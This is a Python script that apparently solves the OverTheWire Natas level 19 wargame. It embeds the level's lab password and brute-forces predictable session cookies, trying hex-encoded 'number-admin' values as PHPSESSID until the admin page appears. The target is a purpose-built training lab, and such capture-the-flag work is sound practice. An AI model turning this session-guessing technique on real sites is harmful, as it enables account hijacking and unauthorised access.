import binascii
from bs4 import BeautifulSoup as bs
from time import *
import urllib
import base64
import binascii
import requests
import re
from string import *
import sys

u='natas19'
p='4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
l=f'http://{u}.natas.labs.overthewire.org/?debug=true'
#print(requests.post(l,auth=(u, p),data={'username':'mikey','password':'2520'}).cookies['PHPSESSID'])
for sid in range(1,641):
    plaintext=str(sid)+'-admin'
    cookies={"PHPSESSID":binascii.hexlify(plaintext.encode()).decode()}
    resp=requests.get(l,auth=(u, p),cookies=cookies).text
    if "Username: natas20" in resp:
        print(resp)
        break
    elif sid%10==0:
        print(f'tried up to {sid}')
